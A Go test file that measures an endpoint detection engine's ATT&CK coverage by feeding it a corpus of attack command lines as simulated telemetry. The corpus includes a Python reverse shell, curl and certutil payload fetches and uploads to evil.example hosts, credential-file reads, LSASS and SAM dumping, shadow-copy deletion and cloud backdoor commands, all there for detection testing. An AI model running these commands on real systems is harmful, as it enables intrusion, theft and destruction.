package detection

import (
	"sort"
	"testing"
)

// TestATTACKSingleEventCoverage is a self-measured ATT&CK coverage harness for
// the single-event detection layer (built-in Sigma + typed findings, via the
// real EvaluateEnvelope oracle). It is NOT a third-party MITRE Evaluation and is
// NOT the live pipeline: it deliberately excludes the SequenceEngine
// (behavioral/recon-burst correlation), IOC matcher, and UEBA — those layers add
// coverage ON TOP (e.g. the discovery singles below are caught live by the
// recon-burst rule, which is why several are marked covered=false here yet rank
// as detections in a live Atomic run).
//
// Honesty controls:
//   - the corpus spans all tactics and is built from CANONICAL technique commands
//     (Atomic Red Team style), not reverse-engineered from our rules;
//   - it INCLUDES techniques we intentionally have no single-event rule for, so
//     the number is a true fraction (<100%), not 100%-by-construction;
//   - misses are printed explicitly.
//
// Run: go test ./internal/detection/ -run ATTACKSingleEventCoverage -v
func TestATTACKSingleEventCoverage(t *testing.T) {
	type tc struct {
		tech   string
		tactic string
		etype  string
		event  map[string]interface{}
		// expectSingleEvent: our honest prior expectation of whether the
		// single-event layer alone should catch it. false = we expect the live
		// behavioral/IOC/UEBA layer to be what catches it (not measured here).
		expectSingleEvent bool
	}
	corpus := []tc{
		// ── Execution ─────────────────────────────────────────
		{"T1059.001", "execution", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -nop -enc SQBFAFgA`), true},
		{"T1059.003", "execution", "process", proc(`C:\Windows\System32\cmd.exe`, `cmd /c "echo hi"`), false},
		{"T1059.006", "execution", "process", procL("/usr/bin/python3", `python3 -c 'import socket,pty;s=socket.socket();s.connect(("10.0.0.1",4444));pty.spawn("/bin/sh")'`), true},
		{"T1204.002", "execution", "process", procP(`C:\Program Files\Microsoft Office\root\Office16\winword.exe`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -enc ZQB2AA==`), true},
		{"T1047", "execution", "process", proc(`C:\Windows\System32\wbem\WMIC.exe`, `wmic process call create "cmd /c calc"`), false},

		// ── Persistence ───────────────────────────────────────
		{"T1547.001", "persistence", "registry", reg(`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "Updater", `C:\Users\v\AppData\Local\Temp\evil.exe`), true},
		{"T1547.004", "persistence", "registry", reg(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, "Shell", `explorer.exe,C:\Users\Public\evil.exe`), true},
		{"T1546.001", "persistence", "process", proc(`C:\Windows\System32\reg.exe`, `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d C:\evil.dll /f`), true},
		{"T1037.001", "persistence", "process", proc(`C:\Windows\System32\reg.exe`, `reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d C:\Users\Public\evil.bat /f`), true},
		{"T1547.014", "persistence", "registry", reg(`HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{x}`, "StubPath", `C:\Users\Public\evil.exe`), true},
		{"T1053.005", "persistence", "process", proc(`C:\Windows\System32\schtasks.exe`, `schtasks /create /tn evil /tr C:\Users\Public\e.exe /sc onlogon`), true},
		{"T1543.003", "persistence", "process", proc(`C:\Windows\System32\sc.exe`, `sc create evilsvc binPath= C:\Users\Public\e.exe start= auto`), true},
		{"T1574.001", "persistence", "image_load", imgload("legit.exe", `C:\Users\v\AppData\Roaming\app\version.dll`, false), false},
		{"T1197", "persistence", "process", proc(`C:\Windows\System32\bitsadmin.exe`, `bitsadmin /transfer j https://evil/p.exe C:\Users\Public\p.exe`), true},
		{"T1098.004", "persistence", "process", procL("/bin/sh", `sh -c "echo ssh-rsa AAAA attacker >> /home/v/.ssh/authorized_keys"`), true},
		{"T1556.003", "persistence", "process", procL("/usr/bin/tee", `tee -a /etc/pam.d/sshd`), true},
		{"T1547.006", "persistence", "process", procL("/usr/sbin/insmod", `insmod /tmp/rootkit.ko`), true},
		{"T1546.015", "persistence", "registry", reg(`HKCU\Software\Classes\CLSID\{2735412}\InprocServer32`, "", `C:\Users\Public\evil.dll`), true},
		{"T1547.005", "persistence", "registry", reg(`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages`, "", `scecli evilssp`), true},

		// ── Privilege Escalation ──────────────────────────────
		{"T1548.002", "privesc", "registry", reg(`HKCU\Software\Classes\ms-settings\shell\open\command`, "", `C:\Windows\Temp\e.exe`), true},
		{"T1546.008", "privesc", "process", procP(`C:\Windows\System32\sethc.exe`, `C:\Windows\System32\cmd.exe`, `cmd.exe`), true},
		{"T1548.003", "privesc", "process", procL("/usr/bin/sudo", `sudo vim -c ':!/bin/sh'`), true},
		{"T1134", "privesc", "process", proc(`C:\Windows\System32\runas.exe`, `runas /netonly /user:CORP\admin cmd.exe`), true},
		{"T1484.001", "privesc", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `New-GPImmediateTask -TaskName evil -GPODisplayName Default -Command cmd`), true},

		// ── Defense Evasion ───────────────────────────────────
		{"T1562.001", "evasion", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `Set-MpPreference -DisableRealtimeMonitoring $true`), true},
		{"T1070.001", "evasion", "process", proc(`C:\Windows\System32\wevtutil.exe`, `wevtutil cl Security`), true},
		{"T1218.012", "evasion", "process", proc(`C:\Windows\System32\verclsid.exe`, `verclsid.exe /S /C {x}`), true},
		{"T1140", "evasion", "process", proc(`C:\Windows\System32\certutil.exe`, `certutil -decode payload.b64 payload.exe`), true},
		{"T1112", "evasion", "registry", reg(`HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`, "DisableAntiSpyware", `1`), true},
		{"T1497", "evasion", "process", proc(`C:\Windows\System32\wbem\WMIC.exe`, `wmic computersystem get model`), true},
		{"T1027.004", "evasion", "process", procL("/usr/bin/gcc", `gcc /tmp/dropper.c -o /tmp/implant`), true},
		{"T1006", "evasion", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c "[IO.File]::ReadAllBytes('\\.\PHYSICALDRIVE0')"`), true},
		{"T1036.003", "evasion", "process", proc(`C:\Users\Public\svchost.exe`, `svchost.exe -k netsvcs`), true},
		{"T1564.003", "evasion", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -WindowStyle Hidden -File C:\Users\Public\p.ps1`), true},
		{"T1564.004", "evasion", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `Set-Content -Path notes.txt -Stream evil.exe -Value payload`), true},
		{"T1070.006", "evasion", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `(Get-Item C:\evil.exe).LastWriteTime = '2019-01-01 00:00:00'`), true},
		{"T1562.002", "evasion", "process", proc(`C:\Windows\System32\auditpol.exe`, `auditpol /set /category:* /success:disable /failure:disable`), true},

		// ── Credential Access ─────────────────────────────────
		{"T1003.001", "credaccess", "credential_access", credAccess("mimikatz.exe", 1234, 856, "0x1410"), true},
		{"T1003.002", "credaccess", "process", proc(`C:\Windows\System32\reg.exe`, `reg save HKLM\SAM C:\Users\Public\sam.hive`), true},
		{"T1003.004", "credaccess", "process", proc(`C:\Windows\System32\reg.exe`, `reg save HKLM\SECURITY C:\Users\Public\security.hive`), true},
		{"T1003.005", "credaccess", "process", proc(`C:\tools\cachedump.exe`, `cachedump.exe -v`), true},
		{"T1552.001", "credaccess", "process", procL("/bin/grep", `grep -ri password /var/www /home`), false},
		{"T1552.004", "credaccess", "process", procL("/bin/cat", `cat /home/v/.ssh/id_rsa`), true},
		{"T1557.001", "credaccess", "process", procL("/usr/bin/python3", `python3 /opt/Responder/Responder.py -I eth0 -wrf`), true},
		{"T1003.008", "credaccess", "process", procL("/bin/cat", `cat /etc/shadow`), true},
		{"T1552.003", "credaccess", "process", procL("/usr/bin/dd", `dd if=/proc/1234/mem bs=1 skip=140000000 count=1000`), true},
		{"T1552.006", "credaccess", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `Get-GPPPassword -Verbose`), true},
		{"T1539", "credaccess", "process", proc(`C:\Windows\System32\cmd.exe`, `cmd /c copy "C:\Users\v\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\temp\`), true},

		// ── Discovery (mostly burst-caught live, not single-event) ──
		{"T1033", "discovery", "process", proc(`C:\Windows\System32\whoami.exe`, `whoami /all`), false},
		{"T1057", "discovery", "process", proc(`C:\Windows\System32\tasklist.exe`, `tasklist`), false},
		{"T1082", "discovery", "process", proc(`C:\Windows\System32\systeminfo.exe`, `systeminfo`), false},
		{"T1016", "discovery", "process", proc(`C:\Windows\System32\ipconfig.exe`, `ipconfig /all`), false},
		{"T1518.001", "discovery", "process", proc(`C:\Windows\System32\tasklist.exe`, `tasklist /svc | findstr msmpeng`), true},

		// ── Lateral Movement ──────────────────────────────────
		{"T1021.006", "lateral", "process", proc(`C:\Windows\System32\winrs.exe`, `winrs -r:target cmd /c whoami`), true},
		{"T1569.002", "lateral", "process", proc(`C:\Windows\PSEXESVC.exe`, ``), true},
		{"T1570", "lateral", "process", proc(`C:\Windows\System32\xcopy.exe`, `xcopy implant.exe \\target\C$\Windows\Temp\`), false},
		{"T1021.004", "lateral", "process", proc(`C:\tools\plink.exe`, `plink.exe -pw Passw0rd! admin@10.0.0.5 whoami`), true},
		{"T1021.003", "lateral", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','10.0.0.5'))`), true},
		{"T1550.003", "lateral", "process", proc(`C:\tools\Rubeus.exe`, `Rubeus.exe ptt /ticket:doIFmDCCBZSg`), true},
		{"T1021.005", "lateral", "process", proc(`C:\tools\vncviewer.exe`, `vncviewer.exe 10.0.0.5:5900`), true},
		{"T1563.002", "lateral", "process", proc(`C:\Windows\System32\tscon.exe`, `tscon 2 /dest:rdp-tcp#5`), true},
		{"T1570", "lateral", "process", proc(`C:\Windows\System32\xcopy.exe`, `xcopy implant.exe \\target\C$\Windows\Temp\`), true},

		// ── Collection ────────────────────────────────────────
		{"T1560.001", "collection", "process", proc(`C:\Program Files\WinRAR\rar.exe`, `rar a -hp"x" out.rar C:\Users\v\Documents`), true},
		{"T1113", "collection", "process", procL("/usr/sbin/screencapture", `screencapture /tmp/s.png`), true},
		{"T1056.001", "collection", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c "[W]::GetAsyncKeyState(65)"`), true},
		{"T1114", "collection", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `New-MailboxExportRequest -Mailbox ceo -FilePath \\srv\share\ceo.pst`), true},
		{"T1123", "collection", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c "[Audio]::waveInOpen($h,0,$fmt)"`), true},

		// ── Command and Control ───────────────────────────────
		{"T1105", "c2", "process", proc(`C:\Windows\System32\certutil.exe`, `certutil -urlcache -f http://evil/p.exe p.exe`), true},
		{"T1090.003", "c2", "process", proc(`C:\Users\v\AppData\Local\Temp\tor.exe`, `tor.exe -f torrc`), true},
		{"T1568.002", "c2", "dns", dns("kq3v9z7x1p.com"), true},
		{"T1071.001", "c2", "network", netTI("1.2.3.4", "c2"), false},

		// ── Exfiltration ──────────────────────────────────────
		{"T1048.003", "exfil", "dns", dns("ZXhmaWx0cmF0ZWREYXRhMTIzNDU2Nzg5MAo.tunnel.evil.example.com"), true},
		{"T1048", "exfil", "process", procL("/usr/bin/curl", `curl -T /tmp/secret.zip http://evil.example.com/upload`), true},
		{"T1567.002", "exfil", "process", procL("/usr/bin/rclone", `rclone copy /data remote:s3bucket`), true},

		// ── Impact ────────────────────────────────────────────
		{"T1490", "impact", "process", proc(`C:\Windows\System32\vssadmin.exe`, `vssadmin delete shadows /all /quiet`), true},
		{"T1489", "impact", "process", proc(`C:\Windows\System32\net.exe`, `net stop MSSQLSERVER`), true},
		{"T1496", "impact", "process", procL("/tmp/xmrig", `xmrig -o pool.minexmr.com:4444 -u wallet`), true},
		{"T1529", "impact", "process", proc(`C:\Windows\System32\shutdown.exe`, `shutdown /r /f /t 0`), false},
		{"T1561", "impact", "process", proc(`C:\Windows\System32\diskpart.exe`, `diskpart clean all`), true},
		{"T1531", "impact", "process", proc(`C:\Windows\System32\net.exe`, `net user victim /delete`), true},
		{"T1529", "impact", "process", proc(`C:\Windows\System32\shutdown.exe`, `shutdown /r /f /t 0`), true},

		// ── Initial Access ────────────────────────────────────
		{"T1190", "initaccess", "process", procPL("/usr/sbin/apache2", "/bin/sh", `sh -c 'id'`), true},

		// ── Linux / macOS parity batch (2026-07-10) ───────────
		// api-server builtin gap closure (Windows-heavy → Linux/macOS parity).
		{"T1046", "discovery", "process", procL("/usr/bin/nmap", `nmap -sS -sV -p- 10.0.0.0/24`), true},
		{"T1518.001", "discovery", "process", procL("/usr/bin/which", `which falcon-sensor osqueryd crowdstrike`), true},
		{"T1562.001", "evasion", "process", procL("/usr/sbin/setenforce", `setenforce 0`), true},
		{"T1070.004", "evasion", "process", procL("/usr/bin/shred", `shred -u -z /var/log/wtmp`), true},
		{"T1136.001", "persistence", "process", procL("/usr/sbin/useradd", `useradd -m -s /bin/bash -G sudo backdoor`), true},
		{"T1562.001", "evasion", "process", procL("/usr/sbin/spctl", `spctl --master-disable`), true},          // macOS
		{"T1105", "c2", "process", procL("/usr/bin/curl", `curl -o /tmp/payload http://evil.example/x`), true}, // macOS variant
		{"T1497", "evasion", "process", procL("/bin/sh", `sh -c "ioreg -l | grep -i VMware"`), true},           // macOS

		// ── New-technique batch (2026-07-10): cloud/container/discovery/browser ──
		{"T1552.005", "credaccess", "process", procL("/usr/bin/curl", `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role`), true},
		{"T1613", "discovery", "process", procL("/usr/bin/kubectl", `kubectl get secrets -n kube-system`), true},
		{"T1612", "evasion", "process", procL("/usr/bin/docker", `docker build -t evil:latest -f Dockerfile .`), true}, // build image on host (bypass registry scan)
		{"T1614.001", "discovery", "process", procL("/usr/bin/timedatectl", `timedatectl status`), true},
		{"T1201", "discovery", "process", procL("/usr/bin/chage", `chage -l root`), true},
		{"T1217", "discovery", "process", procL("/usr/bin/sqlite3", `sqlite3 /Users/v/Library/Safari/History.db "select url from history_items"`), true},
		{"T1555.003", "credaccess", "process", procL("/bin/cp", `cp "/Users/v/Library/Application Support/Google/Chrome/Default/Login Data" /tmp/ld`), true},
		{"T1087.001", "discovery", "process", procL("/usr/bin/dscl", `dscl . -list /Users`), true}, // macOS

		// ── AD / domain reconnaissance batch (2026-07-13) ──
		{"T1482", "discovery", "process", proc(`C:\Windows\System32\nltest.exe`, `nltest /domain_trusts /all_trusts`), true},
		{"T1087.002", "discovery", "process", proc(`C:\Windows\System32\net.exe`, `net user /domain`), true},
		{"T1087.002", "discovery", "process", proc(`C:\Users\Public\SharpHound.exe`, `SharpHound.exe -c All --outputdirectory C:\temp`), true}, // BloodHound collector
		{"T1018", "discovery", "process", proc(`C:\Windows\System32\nltest.exe`, `nltest /dclist:corp.local`), true},
		{"T1069.002", "discovery", "process", proc(`C:\Windows\System32\net.exe`, `net group "Domain Admins" /domain`), true},

		// ── C2 / Exfil channel + Kerberos/history credaccess batch (2026-07-13) ──
		{"T1071.004", "c2", "process", proc(`C:\Users\Public\dnscat2.exe`, `dnscat2 --dns domain=evil.example.com`), true},
		{"T1071.002", "exfil", "process", proc(`C:\Windows\System32\ftp.exe`, `ftp -s:C:\temp\exfil.txt evil.example.com`), true},
		{"T1558.004", "credaccess", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c "Get-DomainUser -PreauthNotRequired | Invoke-ASREPRoast"`), true},
		{"T1552.003", "credaccess", "process", procL("/bin/grep", `grep -i -E 'pass|token|secret' /home/v/.bash_history`), true},

		// ── Kerberos ticket forging / PtH + AD share/GPO discovery batch (2026-07-13) ──
		{"T1558.001", "credaccess", "process", proc(`C:\Users\Public\Rubeus.exe`, `Rubeus.exe golden /krbtgt:2b576acbe6bcfda7 /user:Administrator /domain:corp.local /sid:S-1-5-21 /nowrap`), true},
		{"T1550.002", "lateral", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c "Invoke-SMBExec -Target 10.0.0.5 -Username admin -Hash aad3b435:2b576acb -Command 'whoami'"`), true},
		{"T1135", "discovery", "process", proc(`C:\Windows\System32\net.exe`, `net view \\FILESRV01`), true},
		{"T1615", "discovery", "process", proc(`C:\Windows\System32\gpresult.exe`, `gpresult /z`), true},

		// ── Cloud attack surface + mail exfil batch (2026-07-13) ──
		{"T1526", "discovery", "process", procL("/usr/local/bin/aws", `aws sts get-caller-identity`), true},
		{"T1580", "discovery", "process", procL("/usr/local/bin/aws", `aws ec2 describe-instances --region us-east-1`), true},
		{"T1619", "discovery", "process", procL("/usr/local/bin/aws", `aws s3 ls s3://corp-backups --recursive`), true},
		{"T1071.003", "exfil", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c "Send-MailMessage -To x@evil.com -Attachments C:\loot.zip -SmtpServer mx.evil.com"`), true},

		// ── Cloud persistence / privilege-escalation batch (2026-07-13) ──
		{"T1136.003", "persistence", "process", procL("/usr/local/bin/aws", `aws iam create-user --user-name backdoor`), true},
		{"T1098.001", "persistence", "process", procL("/usr/local/bin/aws", `aws iam create-access-key --user-name backdoor`), true},
		{"T1098.003", "privesc", "process", procL("/usr/local/bin/aws", `aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`), true},

		// ── Cloud defense-evasion batch (2026-07-13) ──
		{"T1562.008", "evasion", "process", procL("/usr/local/bin/aws", `aws cloudtrail stop-logging --name org-trail`), true},
		{"T1562.007", "evasion", "process", procL("/usr/local/bin/aws", `aws ec2 authorize-security-group-ingress --group-id sg-1 --protocol tcp --port 22 --cidr 0.0.0.0/0`), true},
		{"T1578", "evasion", "process", procL("/usr/local/bin/aws", `aws ec2 modify-snapshot-attribute --snapshot-id snap-1 --create-volume-permission Add=[{UserId=999888777}]`), true},

		// ── App-layer persistence / collection batch (2026-07-13) ──
		{"T1114.003", "collection", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c "New-InboxRule -Name Update -ForwardTo attacker@evil.com -DeleteMessage $true"`), true},
		{"T1137", "persistence", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c "Copy-Item evil.xlam 'C:\Users\v\AppData\Roaming\Microsoft\Excel\XLSTART\evil.xlam'"`), true},
		{"T1218.002", "evasion", "process", proc(`C:\Windows\System32\control.exe`, `control.exe C:\Users\Public\evil.cpl`), true},

		// ── Impacket cross-platform lateral movement (2026-07-13) ──
		{"T1021.002", "lateral", "process", procL("/usr/bin/python3", `python3 wmiexec.py corp.local/admin:Passw0rd@10.0.0.5`), true},

		// ── Modern AD attack paths: AD CS / coercion / Kerberos brute (2026-07-13) ──
		{"T1649", "credaccess", "process", procL("/usr/bin/python3", `certipy req -u user@corp.local -p Passw0rd -ca CORP-CA -template User -upn administrator@corp.local`), true},
		{"T1187", "credaccess", "process", procL("/usr/bin/python3", `python3 PetitPotam.py -u user -p Passw0rd 10.0.0.9 10.0.0.1`), true},
		{"T1110", "credaccess", "process", procL("/usr/bin/kerbrute", `kerbrute passwordspray -d corp.local users.txt Spring2026!`), true},
		{"T1218", "evasion", "process", proc(`C:\Windows\System32\msdt.exe`, `msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_BrowseForFile=$(calc)"`), true}, // Follina

		// ── Exfil / C2 / credential-store batch (2026-07-10) ──
		{"T1102", "c2", "process", procL("/usr/bin/curl", `curl https://api.telegram.org/bot123:ABC/sendMessage -d chat_id=1`), true},
		{"T1620", "evasion", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c "[Reflection.Assembly]::Load($bytes)"`), true},
		{"T1555.005", "credaccess", "process", procL("/bin/cp", `cp /home/v/Passwords.kdbx /tmp/loot.kdbx`), true},
		{"T1090.002", "c2", "process", procL("/usr/bin/proxychains", `proxychains4 nmap -sT 10.0.0.0/24`), true},
		{"T1114.001", "collection", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c "Copy-Item C:\Users\v\Documents\Outlook Files\archive.pst \\srv\share"`), true},

		// ── Rootkit / boot / rogue-DC / container-cred batch (2026-07-10) ──
		{"T1552.007", "credaccess", "process", procL("/bin/cat", `cat /var/run/secrets/kubernetes.io/serviceaccount/token`), true},
		{"T1207", "evasion", "process", proc(`C:\tools\mimikatz.exe`, `mimikatz lsadump::dcshadow /object:CN=Administrator /attribute:SidHistory`), true},
		{"T1014", "evasion", "process", procL("/bin/sh", `sh -c "echo /tmp/rk.so > /etc/ld.so.preload"`), true},
		{"T1542.003", "persistence", "process", proc(`C:\Windows\System32\bcdedit.exe`, `bcdedit /set {default} safeboot minimal`), true},
		{"T1091", "lateral", "process", proc(`C:\Windows\System32\cmd.exe`, `cmd /c copy C:\payload.exe E:\autorun_payload.exe`), true},

		// ── Packing / MOTW / macOS-persistence batch (2026-07-10) ──
		{"T1027.002", "evasion", "process", procL("/usr/bin/upx", `upx --best -o /tmp/packed /tmp/implant`), true},
		{"T1553.005", "evasion", "process", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -c "Unblock-File -Path C:\Users\v\Downloads\payload.exe"`), true},
		{"T1547.007", "persistence", "process", procL("/usr/bin/defaults", `defaults write com.apple.loginwindow TALLogoutSavesState -bool true`), true}, // macOS
		{"T1546.014", "persistence", "process", procL("/bin/cp", `cp /tmp/evil.plist /etc/emond.d/rules/evil.plist`), true},                              // macOS
		{"T1037.005", "persistence", "process", procL("/bin/cp", `cp -R /tmp/EvilItem /Library/StartupItems/EvilItem`), true},                            // macOS
	}

	type tally struct{ total, detected int }
	perTactic := map[string]*tally{}
	overall := tally{}
	var misses, surprises []string

	for _, c := range corpus {
		f := EvaluateEnvelope(c.etype, c.event)
		detected := len(f) > 0
		overall.total++
		if perTactic[c.tactic] == nil {
			perTactic[c.tactic] = &tally{}
		}
		perTactic[c.tactic].total++
		if detected {
			overall.detected++
			perTactic[c.tactic].detected++
		}
		switch {
		case c.expectSingleEvent && !detected:
			misses = append(misses, c.tech+" ("+c.tactic+") — expected single-event detection, got MISS")
		case !c.expectSingleEvent && detected:
			surprises = append(surprises, c.tech+" ("+c.tactic+") — caught by single-event layer (bonus)")
		}
	}

	tactics := make([]string, 0, len(perTactic))
	for k := range perTactic {
		tactics = append(tactics, k)
	}
	sort.Strings(tactics)

	t.Logf("ATT&CK 単一イベント検知カバレッジ (built-in Sigma + typed, EvaluateEnvelope) — 自己測定")
	t.Logf("  ※ 第三者MITRE Evalsでも、live behavioral/burst/IOC/UEBA層でもない。単一イベント層の下限値。")
	for _, ta := range tactics {
		v := perTactic[ta]
		t.Logf("  %-12s %2d/%2d", ta, v.detected, v.total)
	}
	pct := 100.0 * float64(overall.detected) / float64(overall.total)
	t.Logf("  ─────────────────────────")
	t.Logf("  TOTAL        %2d/%2d = %.1f%%", overall.detected, overall.total, pct)

	// Honesty: the techniques the single-event layer expectedly does NOT carry
	// (caught live by burst/IOC/UEBA, not here).
	var notSingle []string
	for _, c := range corpus {
		if !c.expectSingleEvent {
			notSingle = append(notSingle, c.tech)
		}
	}
	sort.Strings(notSingle)
	t.Logf("  単一イベント層が(意図的に)担当しない技術(=liveの他層が担当): %v", notSingle)

	if len(misses) > 0 {
		for _, m := range misses {
			t.Errorf("MISS: %s", m)
		}
	}
	for _, s := range surprises {
		t.Logf("  + %s", s)
	}

	// Regression floor: the single-event layer should detect at least the techniques
	// we expect it to. (Coverage of the FULL corpus including burst-only techniques
	// is necessarily lower; that's expected and honest.)
	var expectTotal int
	for _, c := range corpus {
		if c.expectSingleEvent {
			expectTotal++
		}
	}
	t.Logf("  単一イベント期待技術: %d/%d 命中 (期待層のカバレッジ)", expectTotal-len(misses), expectTotal)
}

// ── telemetry constructors (canonical, not rule-derived) ──

func proc(image, cmd string) map[string]interface{} {
	return map[string]interface{}{"type": "process", "image_path": image, "process_name": image, "command_line": cmd, "action": "create"}
}
func procL(image, cmd string) map[string]interface{} { return proc(image, cmd) }
func procP(parent, image, cmd string) map[string]interface{} {
	m := proc(image, cmd)
	m["parent_image_path"] = parent
	return m
}
func procPL(parent, image, cmd string) map[string]interface{} { return procP(parent, image, cmd) }

func reg(keyPath, valueName, valueData string) map[string]interface{} {
	m := map[string]interface{}{"type": "registry", "key_path": keyPath, "value_data": valueData, "operation": "modify"}
	if valueName != "" {
		m["value_name"] = valueName
	}
	return m
}
func imgload(proc, loaded string, signed bool) map[string]interface{} {
	return map[string]interface{}{"type": "image_load", "process_name": proc, "image_loaded": loaded, "signed": signed, "signature_status": "unsigned"}
}
func credAccess(srcImage string, srcPid, tgtPid int, mask string) map[string]interface{} {
	return map[string]interface{}{"type": "credential_access", "source_image": srcImage, "source_pid": srcPid, "target_pid": tgtPid, "access_mask": mask}
}
func dns(q string) map[string]interface{} { return map[string]interface{}{"type": "dns", "query": q} }
func netTI(dstIP, cat string) map[string]interface{} {
	return map[string]interface{}{"type": "network", "dst_ip": dstIP, "threat_intel_matched": true, "threat_intel_category": cat, "threat_intel_source": "feed"}
}
